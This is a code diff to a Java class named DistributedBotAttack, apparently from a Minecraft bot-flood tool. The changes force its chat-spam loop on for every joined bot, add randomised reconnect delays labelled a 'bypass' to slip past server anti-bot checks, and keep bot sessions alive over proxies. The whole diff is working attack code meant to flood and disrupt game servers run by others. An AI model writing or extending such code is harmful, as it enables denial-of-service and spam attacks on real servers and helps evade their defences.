@@ -57,12 +57,16 @@ public class DistributedBotAttack extends IAttack {
 	String name;
 	boolean custspam;
 	boolean autoauth;
-	boolean spam;
+	boolean spam = true;
 	boolean debug;
 	boolean test;
+	boolean ReconncetBypass;
+	int ReconncetDelay;
 	int spamdelay;
 
 	public void start(final String ip, final int port) {
+		ReconncetDelay = config.toint(config.getValue("reconnectdelay"));
+		ReconncetBypass = config.getBoolean("reconnectbypass");
 		spamdelay = config.toint(config.getValue("spamdelay"));
 		debug = config.getBoolean("debug");
 		Utils.log("请输入名称前缀：如CNMD 末尾自动添加后缀");
@@ -130,27 +134,23 @@ public class DistributedBotAttack extends IAttack {
 
 		});
 
-		if (spam) {
-			spamThread = new Thread(() -> {
-				while (true) {
-					try {
-						synchronized (clients) {
-							clients.forEach(c -> {
-								if (c.getSession().isConnected()) {
-									if (c.getSession().hasFlag("join")) {
-										spammer(c.getSession(), spammessage);
+		spamThread = new Thread(() -> {
+			while (true) {
+				try {
+					synchronized (clients) {
+						clients.forEach(c -> {
+							if (c.getSession().isConnected() && c.getSession().hasFlag("join")) {
+								spammer(c.getSession(), spammessage);
 
-									}
-								}
-							});
-						}
-						Thread.sleep(spamdelay);
-					} catch (Exception e) {
+							}
+						});
 					}
-
+					Thread.sleep(spamdelay);
+				} catch (Exception e) {
 				}
-			});
-		}
+
+			}
+		});
 
 		tabThread = new Thread(() -> {
 			while (true) {
@@ -170,12 +170,12 @@ public class DistributedBotAttack extends IAttack {
 
 		mainThread.start();
 		regThread.start();
+		spamThread.start();
 		if (tabThread != null)
 			tabThread.start();
 		if (taskThread != null)
 			taskThread.start();
-		if (spam)
-			spamThread.start();
+
 	}
 
 	@SuppressWarnings("deprecation")
@@ -300,9 +300,7 @@ public class DistributedBotAttack extends IAttack {
 				if (debug) {
 					if (e.getPacket() instanceof ClientChatPacket) {
 						ClientChatPacket packet = e.getPacket();
-						String sendmessage;
-						sendmessage = packet.getMessage();
-						Utils.log("[Client]" + "[" + username + "]" + "[发送聊天]" + sendmessage);
+						Utils.log("[Client]" + "[" + username + "]" + "[发送聊天]" + packet.getMessage());
 					}
 				}
 			}
@@ -322,15 +320,31 @@ public class DistributedBotAttack extends IAttack {
 				}
 				Utils.log("Client", "[断开][" + username + "] " + msg);
 				String reason = e.getReason();
+				boolean blacklisted = reason.contains("已被") && reason.contains("黑名单");
 				boolean stats = reason.contains("重") || reason.contains("join") || reason.contains("antibot")
 						|| reason.contains("加入") || reason.contains("反") || reason.contains("等");
-				if (stats) {
+				if (stats && !blacklisted) {
 					Utils.log("[" + username + "]正在重连......");
-					Client client1 = createClient(ip, port, username, proxy);
-					client1.getSession().setReadTimeout(10 * 1000);
-					client1.getSession().setWriteTimeout(10 * 1000);
-					clients.add(client1);
-					client1.getSession().connect(false);
+					try {
+						if (ReconncetBypass) {
+							Random random = new Random();
+							Thread.sleep(ReconncetDelay + random.nextInt(2000));
+						} else {
+							Thread.sleep(ReconncetDelay);
+
+						}
+						Client client1 = createClient(ip, port, username, proxy);
+						client1.getSession().setReadTimeout(10 * 1000);
+						client1.getSession().setWriteTimeout(10 * 1000);
+						clients.add(client1);
+						client1.getSession().connect(false);
+					} catch (Exception e1) {
+						Utils.log(e1);
+						// TODO: handle exception
+					}
+
+				}
+				if (blacklisted) {
 
 				}
 			}
@@ -370,9 +384,7 @@ public class DistributedBotAttack extends IAttack {
 	public void sendTab(Session session, String text) {
 		try {
 			// session.send((Packet) new ClientSwingArmPacket());
-			// session.send((Packet) new ClientChangeHeldItemPacket(1 + new
-			// Random().nextInt(8)));
-			// session.send((new ClientKeepAlivePacket(1)));
+			session.send((new ClientKeepAlivePacket(1)));
 		} catch (Exception e) {
 		}
 	}
